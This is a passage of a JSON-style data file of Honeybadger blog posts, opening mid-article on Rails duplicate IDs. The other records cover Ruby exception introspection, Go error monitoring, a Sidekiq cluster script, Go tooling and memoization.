\"favorite_fruits\" . \"id\" = $2 [[ \"updated_at\" , \"2020-04-16 06:24:57.989195\" ], [ \"id\" , 123 ]] Uh oh. You can see that even though find_by scoped the record by specific fields, when we called update on the Rails record, it created a simple WHERE id = x query, which also breaks with duplicate IDs. How did we get around this? We made a custom update method, update_unique , which looks like this: class FavoriteFruit def update_unique ( attributes ) run_callbacks :save do self . class . where ( id: id , user_id: user_id ) . update_all ( attributes ) end self . class . find_by ( id: id , user_id: user_id ) end end Which let us update records scoped to more than IDs: $ fruit . update_unique ( last_eaten: Time . now ) FavoriteFruit Update All ( 3.2 ms ) UPDATE \"favorite_fruits\" SET \"last_eaten\" = '2020-04-16 06:24:57.989195' WHERE \"favorite_fruits\" . \"id\" = $1 AND \"favorite_fruits\" . \"user_id\" = $2 [[ \"id\" , \"123\" ], [ \"user_id\" , \"456\" ]] This code ensured a narrow scope for updating records, but by calling the class's update_all method, we lost the callbacks that normally come with updating a record. Therefore, we had to manually run the callbacks and do another database call to retrieve the updated record since update_all doesn't return the updated record. The final product isn't too messy, but it's definitely more difficult to read than fruit.update . The Real Solution Due to sunken costs, management, and time constraints, our solution was to monkey patch Rails into using multiple keys for all database calls. This worked, in the sense that customers would still buy and use the product, but it was a bad idea for several reasons: Any future development might inadvertently reintroduce bugs by using common Rails methods. New developers will need strict training to keep the code free of hidden bugs, such as using the reload method. The code is more complicated, less clear, and less maintainable. This is technical debt that slows down development speed more and more as the project goes on. Testing slows down a lot. You need to test not only that a function works but also that it works when various objects have duplicate IDs. It takes more time to write tests, and then each time the test suite is run, it takes more time to run through all the extra tests. Testing can also easily miss bugs if each developer on the project doesn't carefully test all possible scenarios. The real solution to this problem is to never have duplicate IDs in the first place. If data need to be transferred from one database to another, then the script doing that should collect and insert the data without IDs, allowing the receiving database to use its standardized auto-increment counter to give each record its own unique ID. Another solution would be to use UUIDs for all records. This type of ID is a long string of characters created at random (instead of step-by-step counting, as with an integer ID). Then, moving data to other databases would have no conflicts or issues. The bottom line is that Rails was built with the understanding that IDs are unique per record and a quick and easy way to manipulate specific data in the database. Rails is an opinionated framework, and the beauty of this is how smoothly everything runs, as long as you stick to the Rails way of doing things. This applies not only to Rails but also to many other aspects of programming. When things get complicated, we should know how to identify the problem; however, if we write clear, maintainable, and conventional code, we can avoid many of these complications in the first place.", "date": "2021-02-15"},
{"website": "Honey-Badger", "title": "Logging local & instance variables when exceptions occur in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/log-local-variables-and-instance-variables-when-exceptions-occur-in-ruby/", "abstract": "Have you ever had a bug that you couldn't easily reproduce? It only seems to happen when people have used your app for a while. And the error message and backtrace are surprisingly unhelpful. It's times like these that it would be really handy if you could take a snapshot of the app's state just before the exception occurred. If you could have, for example, a list of all the local variables and their values.  Well, you can - and it's not even that hard! In this post I'll show you how to capture locals at the time of an exception. But first, I need to warn you. None of these techniques should be used in production. You can use them in staging, preprod, development, etc. Just not production. The gems we'll use rely on some pretty heavy introspection magic, that at best will slow your app down. At worst...who knows? Introducing binding_of_caller The binding_of_caller gem lets you access bindings for any level of the current stack. Sooo.....what exactly does that mean? The \"stack\" is simply a list of methods currently \"in-progress.\"  You can use the caller method to examine the current stack.  Here's a simple example: def a puts caller . inspect # [\"caller.rb:20:in `<main>'\"] b () end def b puts caller . inspect # [\"caller.rb:4:in `a'\", \"caller.rb:20:in `<main>'\"] c () end def c puts caller . inspect # [\"caller.rb:11:in `b'\", \"caller.rb:4:in `a'\", \"caller.rb:20:in `<main>'\"] end a () A binding is a snapshot of the current execution context. In the example below, I capture the binding of a method, then use it to access the method's local variables. def get_binding a = \"marco\" b = \"polo\" return binding end my_binding = get_binding puts my_binding . local_variable_get ( :a ) # \"marco\" puts my_binding . local_variable_get ( :b ) # \"polo\" The binding_of_caller gem gives you access to the binding for any level of the current execution stack. For example, I could use it to allow the c method access to the a method's local variables. require \"rubygems\" require \"binding_of_caller\" def a fruit = \"orange\" b () end def b fruit = \"apple\" c () end def c fruit = \"pear\" # Get the binding \"two levels up\" and ask it for its local variable \"fruit\" puts binding . of_caller ( 2 ). local_variable_get ( :fruit ) end a () # prints \"orange\" At this point, you're probably feeling two conflicting emotions. Excitement, because this is REALLY COOL. And revulsion, because this could degenerate into an ugly mess of dependencies faster than you can say DHH. Logging locals at the time of exception Now that we've mastered binding_of_caller, logging all the local variables at the time of exception is a piece of cake. In the example below I'm overriding the raise method. My new raise method fetches the binding of whatever method called it. Then it iterates through all locals and prints them out. require \"rubygems\" require \"binding_of_caller\" module LogLocalsOnRaise def raise ( * args ) b = binding . of_caller ( 1 ) b . eval ( \"local_variables\" ). each do | k | puts \"Local variable #{ k } : #{ b . local_variable_get ( k ) } \" end super end end class Object include LogLocalsOnRaise end def buggy s = \"hello world\" raise RuntimeError end buggy () Here's what it looks like in action: Exercise: Log instance variables I'll leave it as an exercise for you to log instance variables alongside locals. Here's a hint: you can use my_binding.eval(\"instance_variables\") and my_binding.instance_variable_get in exactly the same way that you would use my_binding.eval(\"local_variables\") and my_binding.instance_variable_get . The easy way This is a pretty cool trick. But grepping around log files isn't the most convenient way to fix bugs, especially if your app is on staging and you have multiple people using it. Also, it's just more code that you have to maintain. If you happen to use Honeybadger to monitor your app for errors, we can capture locals automatically. All you have to do is add the binding_of_caller gem to your Gemfile: # Gemfile group :development , :staging do # Including this gem enables local variable capture via Honeybadger gem \"binding_of_caller\" ... end Now, whenever an exception occurs, you'll get a report of all locals along with the backtrace, params, etc.", "date": "2015-07-20"},
{"website": "Honey-Badger", "title": "New: Improvements on Honeybadger's User Interface", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/new-improvements-on-honeybadgers-user-interface/", "abstract": "You may have noticed some UI changes at Honeybadger recently. These include some improvements that may not be obvious at first glance. Let's take a look. Code Snippets for every backtrace line We now show code snippets for every line of the backtrace. Just click on the magnifying-glass icon to see them: Note: You'll need to be running the latest version of the honeybadger ruby gem to get these additional snippets. Responsive Design The new site is fully responsive. Now it's much easier to view and respond to errors that happen when you're away from your desk. Quicker navigation between projects Most pages now contain a project search dropdown. Prefer to use the keyboard? Press \"J\" (for jump), start typing your project name and hit return when there's a match. Quicker error assignment You can now assign errors to your teammates from the error list, which is much quicker if you have several to do. Easier navigation between fault occurrences We've added an occurrence navbar which not only lets you flip between occurrences but also displays a summary of the occurrence being viewed. More scannable error lists The error list has been redesigned to make it easier to scan quickly. Instead of full timestamps, you now see relative dates. You will also see large numbers displayed in a condensed format. You can still see the exact numbers and timestamps by clicking through to the error page. Better organized user settings We've consolidated our scattered user setting pages, and cleaned them up quite a bit. Now, it's possible to toggle all your personal notifications in one place. Enjoy the new changes! If you have any questions or feedback, please email us at support@honeybadger.io .", "date": "2016-10-31"},
{"website": "Honey-Badger", "title": "Announcing  realtime error monitoring for Go", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/error-monitoring-for-go/", "abstract": "If you're a Go developer, we have some great news! You can now monitor your Go applications for panics and errors with Honeybadger! We've been working hard to create the same great error monitoring experience that our Ruby customers enjoy for the Go community, and we hope you'll love the results. How to get started To get started, head over to honeybadger.io and sign in or create a new account (if you're not already a user you can sign up for a 15-day free trial). Create a new project and select \"Go\" as the language. From there we'll give you instructions on how to import and configure our error monitoring client in your application. If you don't have a go application to work with, but would like to check out our go features anyway, you can use a sample application that we developed for just that purpose. You can run it locally, or deploy it to Heroku with our one-click installer . Rich Backtraces Just like with Ruby, the Honeybadger backtrace is more than just a backtrace. You can click on any line and jump directly to the code in Github, Bitbucket or your local editor. You can read it more easily, since we display the backtrace for YOUR code separately from the full trace. And you can even choose which format in which you'd like the trace displayed. We'll determine which lines of the stacktrace originate in your application and link to the code on GitHub. Useful Context Error notifications are so much more useful when enhanced with a little data. And Honeybadger lets you send whatever data you like along with your errors. For example, you can send a the current user's email address, to make post-error followup amazingly easy. Send additional context data about what's going on before the error occurs. Environmental Awareness If you have multiple copies of your application running on multiple servers, knowing exactly where an error came from is critical. Fortunately, it couldn't be simpler. Honeybadger's \"app environment\" tells you the hostname and process id of the offender. It even shows you a snapshot of RAM and CPU usage at the time of the error! See system stats and other information from your server's environment at the time of the panic. An at-a-glance summary As cool as all these details are, you don't always have time to parse them. That's why we provide an incredibly useful at-a-glance summary for every exception. Summary data includes things like URL, Referrer, and browser information from the request. Request parameters for faster debugging. Awesome collaboration and management tools. We hope you'll give us a try for monitoring your next Go application. Have questions or comments? Drop us a line at support@honeybadger.io -- we'd love to hear from you!", "date": "2015-07-08"},
{"website": "Honey-Badger", "title": "Introducing our Sidekiq cluster script", "author": ["Benjamin Curtis"], "link": "https://www.honeybadger.io/blog/introducing-our-sidekiq-cluster-script/", "abstract": "At Honeybadger we depend heavily on Sidekiq in our processing pipeline.  Nearly everything we do runs through a queue at some point.  As a result, I want to make sure we are running Sidekiq well.  With our recent move to EC2, we changed from having a stable set of long-lived servers to an ever-changing set of instances running our jobs.  This prompted me to revisit how we start Sidekiq at boot time, as that is now much more important than it was previously. In the past we depended on god to spin up all the worker processes, since we wanted it to monitor them and terminate the ones that ended up using too much memory.  Our god config was hand-tuned for the servers that we had deployed to run those workers.  Unfortunately, I found that when booting our old god config on the new instances using systemd, we'd sometimes get more workers running than our configuration specified.  This would lead to memory pressure on the instances, which was bad news.  After fiddling with it for a while, and realizing that we weren't using much of its functionality, I decided it was time to stop using god to manage the processes. One simple command for running multiple Sidekiq processes What I really wanted was a script that I could run as a systemd service that would spawn one Sidekiq process per core and that would restart processes that consumed too much memory.  The script needed to be able to work with EC2 instances of various sizes, as the number of cores and the amount of RAM could vary as I tried different instance sizes to see what would work best for our workload.  Since I couldn't find a script that would do exactly that, I wrote one: Of course, there's a bit of borrowed code in that script. :)  The code in the process_count method probably comes from Stack Overflow (I've been using it for years in our unicorn configurations) and the fork_child method is basically the sidekiq bin from the sidekiq gem. This script spawns a number of child processes based on the number of CPU cores present, with each child process being the same as if you had run the sidekiq command directly.  As a result, whatever command-line options you pass to this script will get passed to (and parsed by) the Sidekiq CLI code.  In other words, you can pass any options to this script that you can pass to sidekiq when running it directly, though some options (like the pid file option) don't make sense to use.  A thread is also spawned to periodically check the memory usage of each child process.  If any child process crosses the usage threshold, it is killed and a new process is spawned to replace it. Working with the cluster While the number of processes defaults to the number of cores (assuming you are dedicating an instance to running Sidekiq processes), you can override that by setting the SK_PROCESS_COUNT environment variable before running the script.  Likewise, the memory threshold is set as a percentage of the total RAM of the instance (leaving some RAM to spare by adding one to the process_count value on line 58), but you can set whatever percentage you want with the SK_MEMORY_PCT_LIMIT environment variable.  We use these two variables to restrict the number of Sidekiq processes and memory usage on instances that are running the Rails app that powers our UI. As an added bonus, this script catches the signals typically used to manage Sidekiq processes and passes those signals on to the child processes.  This allows us to use pkill -f -USR1 skcluster to have the child processes stop accepting new work (this is an early task in our deployment script), and we can use pkill -f skcluster to terminate everything. Configuring systemd The systemd service definition is straightforward: Since we use pgbouncer on every instance to proxy connections to postgres, we ensure that the pgbouncer service is running before the sidekiq processes get booted.  If we were running redis on the same instances, we would also add redis-server.service to the Requires and After lines.  The EnvironmentFile uses the - prefix to the filename to tell systemd that it's ok if the file doesn't exist.  This allows us to omit that file when we want to go with the default process count and memory limit.  We use the --require option to let Sidekiq know where to go to load our Rails application's configuration and initializers.  Since the skcluster script catches SIGTERM, we can use systemctl restart skcluster.service to restart all the workers (this is a late task in our deployment script). We've been using this script for a while now, and it has worked like a champ.  We don't have any more problems with too many processes getting spawned at boot, we don't have any more memory usage warnings from our monitoring, and we can launch any type of EC2 instance that we want.  Hassle-free ops is the kind of ops I like the most. :)", "date": "2017-02-08"},
{"website": "Honey-Badger", "title": "PHP Exception Monitoring with Honeybadger", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/php-exception-monitoring-with-honeybadger/", "abstract": "Don't forget where you come from It's 2013, baby, you're a badass rails developer. Sure you've made a few mistakes. Most of them in PHP. But those days are long gone left behind in a trail of dust with your matchbox twenty LPs and your matrix trenchcoat. ...but lately, you've been twitchy. You've seen things. In the corner of your eye. In flashes in the mirror. It's PHP. Everywhere, it's PHP. You realize you haven't left your legacy projects behind. You've just traded them with someone else. And they're way worse than you ever were. But anyway. We're all adults here. We're over the whole \"making fun of PHP\" thing. Gabe saves the day You're responsible for these apps now. Wouldn't it be nice to have the same world-class error monitoring that you've grown used to in your rails projects? Now you do. Let's all give a huge round of applause to Gabe Evans . This super-talented ruby developer has taken a bullet for all of us and built the most amazing PHP client for Honeybadger. Check it out on github The setup is very simple: `<?php\n\nuse Honeybadger\\Honeybadger;\n\nHoneybadger::$config->values(array(\n    'api_key' => '[your-api-key]',\n));\n` And it even supports more advanced features, like sending your own custom notices `<?php\n\ntry\n{\n    $params = array(\n        // Params that you pass to a method that can throw an exception.\n    );\n    my_unpredictable_method($params);\n}\ncatch (Exception $e)\n{\n    Honeybadger::notify(array(\n        'error_class'   => 'Special Error',\n        'error_message' => 'Special Error: '.$e->getMessage(),\n        'parameters'    => $params,\n    ));\n}\n` There's still a few features left to be ported over from the main gem, but all the major stuff is there. And if you find yourself missing a certain feature, let us know. We'll make it happen.", "date": "2013-04-23"},
{"website": "Honey-Badger", "title": "An Introduction to Go Tooling", "author": ["Ayooluwa Isaiah"], "link": "https://www.honeybadger.io/blog/ruby-to-go-5/", "abstract": "An overview of Go tooling Tooling is generally considered one of the stronger aspects of the Go\necosystem. The go command is the gateway to many of the tools that will be\ndiscussed in this post. By learning about each of the tools discussed here, you'll become much more\nefficient when working on Go projects and perform common tasks quickly and\nreliably. Viewing environmental variables The go env command is used to display information about the current Go environment.\nHere's a sample of what this command outputs: GO111MODULE = \"on\" GOARCH = \"amd64\" GOBIN = \"/home/ayo/go/bin\" GOCACHE = \"/home/ayo/.cache/go-build\" GOENV = \"/home/ayo/.config/go/env\" GOEXE = \"\" GOFLAGS = \"\" GOHOSTARCH = \"amd64\" GOHOSTOS = \"linux\" GOINSECURE = \"\" GONOPROXY = \"\" GONOSUMDB = \"\" GOOS = \"linux\" GOPATH = \"/home/ayo/go\" GOPRIVATE = \"\" GOPROXY = \"https://proxy.golang.org,direct\" GOROOT = \"/usr/lib/go\" GOSUMDB = \"sum.golang.org\" GOTMPDIR = \"\" GOTOOLDIR = \"/usr/lib/go/pkg/tool/linux_amd64\" GCCGO = \"gccgo\" AR = \"ar\" CC = \"gcc\" CXX = \"g++\" CGO_ENABLED = \"1\" GOMOD = \"/dev/null\" CGO_CFLAGS = \"-g -O2\" CGO_CPPFLAGS = \"\" CGO_CXXFLAGS = \"-g -O2\" CGO_FFLAGS = \"-g -O2\" CGO_LDFLAGS = \"-g -O2\" PKG_CONFIG = \"pkg-config\" GOGCCFLAGS = \"-fPIC -m64 -pthread -fmessage-length=0 -fdebug-prefix-map=/tmp/go-build145204762=/tmp/go-build -gno-record-gcc-switches\" If you want to view the value of a specific variable, you can pass them as\narguments to the go env command: $ go env GOPATH GOROOT GOBIN\n/home/ayo/go\n/usr/lib/go\n/home/ayo/go/bin The documentation for each of the variables can be accessed using the command\nbelow: go help environmental Running code with go run Assuming you have a main.go file with the following code, package main import \"fmt\" func main () { fmt . Println ( \"Welcome to Go!\" ) } You can run it using the go run command, as we've already seen several times in\nthis series: $ go run main.go\nWelcome to Go! The go run command compiles the program, creates an executable in your /tmp directory, and executes this binary in one step. If you want to execute several\nfiles at once, you can pass them all as arguments to go run : $ go run main.go time.go input.go Or you can use a wildcard: $ go run * .go You can also run an entire package at once, as of Go v1.11: $ go run ./foo # Run the package in the `foo` directory $ go run . # Run the package in the current directory Formatting code with gofmt If you've been writing Go code for any length of time, you will know that there\nare strict conventions for how code should be formatted. The gofmt command is\nwhat enforces these conventions for all Go code in existence. The code snippet shown in the previous section was not formatted properly, so\nlet's format it with gofmt , as demonstrated below: $ gofmt main.go\npackage main\n\nimport \"fmt\" func main () { fmt.Println ( \"Welcome to Go!\" ) } This formats the code in the source file and prints the result to the standard\noutput. If you want to overwrite the source file with the formatted output, you\nneed to add the -w flag. $ gofmt -w main.go To format Go source files recursively (current directory and subdirectories),\nspecify a . as the argument to gofmt . gofmt . Fixing import statements Before you can use a package in your code, you need to import it. If you\nfail to do so, the code will not compile, and an error will be displayed. Given\nthe following code in your main.go file, package main func main () { fmt . Println ( \"Welcome to Go!\" ) } You should see the following error if you attempt to execute the program: $ go run main.go # command-line-arguments ./main.go:4:2: undefined: fmt Before the code can compile, the fmt package must be imported. You can add the\nnecessary code manually or use the goimports command, which adds the necessary\nimport statements for you. $ goimports main.go\npackage main\n\nimport \"fmt\" func main () { fmt.Println ( \"Welcome to Go!\" ) } The command also removes any imported packages that are no longer referenced and\nformats the code in the same style as gofmt . So, you can also think of goimports as a replacement for gofmt . The value of goimports becomes apparent if you set your editor to run it on\nsaving a Go source file. That way, you won't need to worry about importing a\npackage before using it or importing statements that are no longer needed. It'll be\ndone automatically for you as soon as you save the file. Most code editors have\nsome sort of plugin or setting that should help with this. Building your project To build an executable binary for your program, use the go build command. This\nwill output a single binary in the current directory: $ go build $ ./demo\nWelcome to Go! The binary produced with go build is specific to your operating system\narchitecture, and it contains everything you need to run the program. Therefore, you can\ntransfer it to another machine with the same architecture, and it'll run in\nthe same manner even if Go is not installed. If you want to cross-compile a binary for an architecture other than\nyour own, all you need to do is change the values of the GOOS and GOARCH environmental variables before running the go build command. For example, the following command can be used to produce a binary for a 64-bit\nWindows machine: $ GOOS = windows GOARCH = amd64 go build To compile for Linux, macOS, ARM, Web Assembly, or other targets,\nplease refer to the Go docs to see the combinations of GOOS and GOARCH that are available to you. Installing Go binaries The go install command is an alternative to go build if you want to be able\nto run the program from outside its source directory. Assuming your main.go file is in a directory called demo , the following\ncommand will create a demo binary in your $GOPATH/bin directory. $ go install The $GOPATH should be $HOME/go on most computers. You can check it with the go env command: $ go env GOPATH\n/home/ayo/go If you list the contents of $GOPATH/bin , you should see a demo binary: $ ls $GOPATH /bin\ndemo This binary can be executed by running the demo command from any location on\nyour filesystem. This only works as long as the $GOPATH/bin directory has been\nadded to your $PATH . $ demo\nWelcome to Go! Listing package information The default invocation of go list returns the name of the import path for the\ndirectory you are currently in or the provided package path: $ go list\ngithub.com/ayoisaiah/demo $ go list github.com/joho/godotenv\ngithub.com/joho/godotenv We can customize the output of the go list command using the -f flag, which\nallows you to execute a Go template that has access to the internal data\nstructures of the go tool. For example, you can list the name of the fmt using\nthe command below: $ go list -f \"{{ .Name }}\" fmt\nfmt That's not very interesting on its own, but there's more. You can print all the\ndependencies of a package using the {{ .Imports }} template. Here's\nthe output for the fmt package: $ go list -f \"{{ .Imports }}\" fmt [ errors internal/fmtsort io math os reflect strconv sync unicode/utf8] Or, you can list the complete set of transitive dependencies for a package: $ go list -f \"{{ .Deps  }}\" fmt [ errors internal/bytealg internal/cpu internal/fmtsort internal/oserror internal/poll internal/race internal/reflectlite internal/syscall/execenv internal/syscall/unix internal/testlog io math math/bits os reflect runtime runtime/internal/atomic runtime/internal/math runtime/internal/sys sort strconv sync sync /atomic syscall time unicode unicode/utf8 unsafe] You can also use the go list command to check for updates to dependencies and\nsubdependencies: $ go list -m -u all Or, check for updates to a specific dependency: $ go list -m -u go.mongodb.org/mongo-driver\ngo.mongodb.org/mongo-driver v1.1.1 [ v1.4.0] There's a lot more you can do with the go list command. Make sure to check the documentation for flags and\nother template variables that may be used with the command. Displaying documentation for a package or symbol The go doc command prints the documentation comments associated with the item\nidentified by its arguments. It accepts zero, one, or two arguments. To display the package documentation for the package in the current directory,\nuse the command without any arguments: $ go doc If the package is a command (the main package), documentation for exported\nsymbols are omitted in the output, except when the -cmd flag is provided. We can use the go doc command to view the docs for any package by passing the\nimport path for the package as an argument to the command: $ go doc encoding/json\npackage json // import \"encoding/json\" Package json implements encoding and decoding of JSON as defined in RFC\n7159. The mapping between JSON and Go values is described in the\ndocumentation for the Marshal and Unmarshal functions. [ truncated for brevity] If you want to view the documentation for a specific method in a package, simply pass it\nas a second argument to go doc : $ go doc encoding/json Marshal A second command, godoc , presents the documentation for all Go packages\n(including any third-party dependencies you have downloaded) as a webpage.\nRunning the command will start a web server on port 6060 by default, but you can\nchange the address with the -http flag. $ godoc -http = :6060 Performing static analysis The go vet command is one that helps with detecting suspicious constructs in\nyour code that may not be caught by the compiler. These are things that may not\nnecessarily prevent your code from compiling but will affect code quality, such\nas unreachable code, unnecessary assignments, and malformed format string arguments. $ go vet main.go # Run go vet on the `main.go` file $ go vet . # Run go vet on all the files in the current directory $ go vet ./... # Run go vet recursively on all the files in the current directory This command is composed of several analyzer tools, which are listed\nhere , with each one performing a different check on the\nfile. All checks are performed by default when the go vet command is executed. If you\nonly want to perform specific checks (ignoring all the others), include the name\nof the analyzer as a flag and set it to true . Here's an example that runs the printf check alone: $ go vet -printf = true ./... However, passing the -printf=false flag to go vet will run all\nchecks except printf . $ go vet -printf = false ./... Adding dependencies to your project Assuming you have Go modules enabled, go run , go build , or go install will download any external dependencies needed to fulfill the import\nstatements in your program. By default, the latest tagged release will be\ndownloaded or the latest commit if no tagged releases are available. If you need to download a specific version of a dependency other than the one Go\nfetches by default, you can use the go get command. You can target a\nspecific version or commit hash: $ go get github.com/joho/godotenv@v1.2.0 $ go get github.com/joho/godotenv@d6ee687 This method may be used to upgrade or downgrade dependencies as needed. Any\ndownloaded dependencies are stored in the module cache located at $GOPATH/pkg/mod . You can use the go clean command to clear the module cache\nfor all projects in one go: $ go clean -modcache Working with Go modules We covered Go modules in detail in part\n2 of this\nseries. Here's a summary of the commands you need to know to work with modules\neffectively: go mod init will initialize modules in your project. go mod tidy cleans up unused dependencies or adds missing ones. Make sure to\nrun this command before committing to any changes to your code. go mod download will download all modules to the local cache. go mod vendor copies all third-party dependencies to a vendor folder in\nyour project root. go mod edit can be used to replace a dependency in your go.mod file with a local or forked version. For example, if you need to use a fork until a patch is merged upstream, use the following code: go mod edit -replace = github.com/gizak/termui = github.com/ayoisaiah/termui Testing and benchmarking your code Go has a built-in testing command called go test and a testing package, which\ncan be combined to provide a simple but complete unit testing experience. The test tool also includes benchmarking and code coverage options to help you profile\nyour code even more. Let's write a simple test to demonstrate some of the capabilities of the test tool. Modify the code in your main.go file, as shown below: package main import \"fmt\" func welcome () string { return \"Welcome!\" } func main () { fmt . Println ( welcome ()) } Then, add the test in a separate main_test.go file in the same directory: package main import \"testing\" func TestWelcome ( t * testing . T ) { expected := \"Welcome to Go!\" str := welcome () if str != expected { t . Errorf ( \"String was incorrect, got: %s, want: %s.\" , str , expected ) } } If you run go test in the terminal, it should fail: $ go test --- FAIL: TestSum ( 0.00s ) main_test.go:9: String was incorrect, got: Welcome!, want: Welcome to Go!.\nFAIL exit status 1\nFAIL    github.com/ayoisaiah/demo   0.002s We can make the test pass by modifying the return value of the welcome function in the main.go file. func welcome () string { return \"Welcome to Go!\" } Now, the test should pass successfully: $ go test PASS\nok      github.com/ayoisaiah/demo   0.002s If you have lots of test files with test functions but only want to selectively\nrun a few of them, you can use the -run flag. It accepts a regular expression string to\nmatch the test functions that you want to run: $ go test -run = ^TestWelcome $ . # Run top-level tests matching \"TestWelcome\" $ go test -run = String . # Run top-level tests matching \"String\" such as \"TestStringConcatenation\" You should also know the following test flags, which often come in handy when\ntesting Go programs: The -v flag enables the verbose mode so that the names of the tests are printed in the output. The -short flag skips long-running tests. The -failfast flag stops testing after the first failed test. The -count flag runs a test multiple times in succession, which is\nuseful if you want to check for intermittent failures. Code coverage To view your code coverage status, use the -cover flag, as shown below: $ go test -cover PASS\ncoverage: 50.0% of statements\nok      github.com/ayoisaiah/demo   0.002s You can also generate a coverage profile using the -coverprofile flag. This\nallows you to study the code coverage results in more detail: $ go test -coverprofile = coverage.out You will find a coverage.out file in the current directory after running the\nabove command. The information contained in this file can be used to output an\nHTML file containing the exact lines of code that have been covered by\nexisting tests. $ go tool cover -html = coverage.out When this command is run, a browser window pops up showing the covered lines in\ngreen and uncovered lines in red. Benchmarking The benchmarking tool in Go is widely accepted as a reliable way to measure the\nperformance of Go code. Benchmarks are placed inside _test.go files, just like\ntests. Here's an example that compares the performance of different string\nconcatenation methods in Go: // main_test.go package main import ( \"bytes\" \"strings\" \"testing\" ) var s1 = \"random\" const LIMIT = 1000 func BenchmarkConcatenationOperator ( b * testing . B ) { var q string for i := 0 ; i < b . N ; i ++ { for j := 0 ; j < LIMIT ; j ++ { q = q + s1 } q = \"\" } b . ReportAllocs () } func BenchmarkStringBuilder ( b * testing . B ) { var q strings . Builder for i := 0 ; i < b . N ; i ++ { for j := 0 ; j < LIMIT ; j ++ { q . WriteString ( s1 ) } q . Reset () } b . ReportAllocs () } func BenchmarkBytesBuffer ( b * testing . B ) { var q bytes . Buffer for i := 0 ; i < b . N ; i ++ { for j := 0 ; j < LIMIT ; j ++ { q . WriteString ( s1 ) } q . Reset () } b . ReportAllocs () } func BenchmarkByteSlice ( b * testing . B ) { var q [] byte for i := 0 ; i < b . N ; i ++ { for j := 0 ; j < LIMIT ; j ++ { q = append ( q , s1 ... ) } q = nil } b . ReportAllocs () } This benchmark can be invoked using the go test -bench=. command: $ go test -bench = . goos: linux\ngoarch: amd64\npkg: github.com/ayoisaiah/demo\nBenchmarkConcatenationOperator-4        1718        655509 ns/op     3212609 B/op        999 allocs/op\nBenchmarkStringBuilder-4              105122         11625 ns/op       21240 B/op         13 allocs/op\nBenchmarkBytesBuffer-4                121896          9230 ns/op           0 B/op          0 allocs/op\nBenchmarkByteSlice-4                  131947          9903 ns/op       21240 B/op         13 allocs/op\nPASS\nok      github.com/ayoisaiah/demo   5.166s As you can see, the concatenation operator was the slowest of the bunch at\n655509 nanoseconds per operation, while bytes.Buffer was the fastest at 9230\nnanoseconds per operation. Writing benchmarks in this manner is the best way to\ndetermine performance improvements or regressions in a reproducible way. Detecting race conditions A race detector is included with the go tool and can be activated with the -race option. This is useful for finding problems in concurrent systems, which\nmay lead to crashes and memory corruption. $ go test -race ./... $ go run -race main.go $ go build -race ./... $ go install -race ./... Wrapping up In this article, we covered several tools included in each Go environment and provided\nshort descriptions of how they can be used. This is only the tip of the iceberg,\nso be sure to check out the full documentation for a deeper explanation of the capabilities of each command. Thanks for reading, and happy coding!", "date": "2020-12-22"},
{"website": "Honey-Badger", "title": "The Rubyist's Guide to Memoization", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/rubyist-guide-to-memoization/", "abstract": "Today I wanted to talk about one of my favorite techniques for improving performance. It's a source of easy little performance wins that eventually add up, and only occasionally reduce your application to a heap of smoldering rubble. Only very occasionally. This technique is called \"memoization.\" Despite the $10 computer-science word, it simply means that, instead of doing the same work every time you call a method, you save the return value to a variable and use that instead. Here's what it looks like in pseudocode: def my_method @memo = < work > if @memo is undefined return @memo end And here's how you do it in Ruby. This is the most robust approach, but it's quite verbose. There are other, more concise approaches that we'll discuss later. class MyClass def my_method unless defined? ( @my_method ) @my_method = begin # Do your calculation, database query # or other long-running thing here. end end @my_method end end The code above does three things: Checks to see if there is an instance variable named @my_method . If there is, it does some work and saves the result in @my_method . It returns @my_method Don't be confused by the fact that we have both a method and an instance variable named my_method . I could have named my variable anything, but it's convention to name it after the method that is being memoized. A shorthand version One problem with the code above is that it's a bit cumbersome. Because of this, you're much more likely to see a shorthand version that does almost the same thing: class MyClass def my_method1 @my_method1 ||= some_long_calculation end def my_method2 @my_method2 ||= begin # The begin-end block lets you easily # use multiple lines of code here. end end end Both of these use Ruby's a ||= b operator, which is shorthand for a || (a = b) , which is itself more-or-less shorthand for: # You wouldn't use return like this in real life. # I'm just using it to express to beginners the idea # that the conditional evaluates to whatever winds up in `a`. if a return a else a = b return a end A source of bugs If you're paying very close attention you may have noticed that the shorthand versions evaluate the \"truthiness\" of the memo variable instead of checking for the existence of it. This is the source of one of the major limitations of the shorthand version: it doesn't ever memoize nil or false . There are lots of use cases where this isn't important. But it's one of those annoying facts that you have to keep in the back of your mind whenever you're memoizing. Memoizing methods with arguments So far we've only dealt with memoizing single values. But not many functions return the same result all the time. Let's take a look at an old favorite of technical interviews: the Fibonacci sequence. You can calculate the Fibonacci sequence recursively in Ruby like so: class Fibonacci def self . calculate ( n ) return n if n == 0 || n == 1 calculate ( n - 1 ) + calculate ( n - 2 ) end end Fibonacci . calculate ( 10 ) # => 55 The problem with this implementation is that it's inefficient. To prove this, let's add a print statement to view the value of n . class Fibonacci def self . calculate ( n ) print \" #{ n } \" return n if n == 0 || n == 1 calculate ( n - 1 ) + calculate ( n - 2 ) end end Fibonacci . calculate ( 4 ) # Outputs: 4 3 2 1 0 1 2 1 0 As you can see, calculate is being called repeatedly with many of the same values of n . In fact the number of calls to calculate is going to grow exponentially with n . One way around this is to memoize the results of calculate . Doing so isn't very different from the other memoization examples we've covered. class Fibonacci def self . calculate ( n ) @calculate ||= {} @calculate [ n ] ||= begin print \" #{ n } \" if n == 0 || n == 1 n else calculate ( n - 1 ) + calculate ( n - 2 ) end end end end Fibonacci . calculate ( 4 ) # Outputs: 4 3 2 1 0 Now that we've memoized calculate , the number of calls no longer increases exponentially with n . Fibonacci . calculate ( 20 ) # Outputs: 20 19 18 17 16 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 0 Invalidation Memoization is a lot like caching, except that memoized results don't automatically expire, and there's usually not an easy way to clear them once set. For use-cases like the Fibonacci sequence generator this hardly  matters. Fibonacci.calculate(10) will always return the same result. But in other use cases it does matter. For example, you might see code like this: # Not the best idea class User def full_name @full_name ||= [ first_name , last_name ]. join ( \" \" ) end end Personally, I wouldn't use memoization here because if the first or last name is changed, the full name might not be updated. The one place where you can be a little more lax is inside of Rails controllers. It's very common to see code like this: class ApplicationController def current_user @current_user ||= User . find ( ... ) end end This is ok, because the controller instance is destroyed after each web request. It's unlikely that the currently logged-in user would change during any normal request. 